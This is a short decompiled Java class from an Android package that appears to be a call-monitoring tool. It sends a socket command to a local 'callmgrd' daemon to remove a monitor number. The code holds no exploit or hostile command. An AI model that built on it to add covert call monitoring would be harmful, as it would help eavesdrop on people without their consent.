package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.MonitorNumber;

public class RemoteRemoveMonitor
  extends SocketCmd
{
  private static final long serialVersionUID = -4672408481848947239L;
  
  public RemoteRemoveMonitor(MonitorNumber paramMonitorNumber)
  {
    super(paramMonitorNumber, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.callmgrd";
  }
  
  protected String getTag()
  {
    return "RemoteRemoveMonitor";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteRemoveMonitor.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */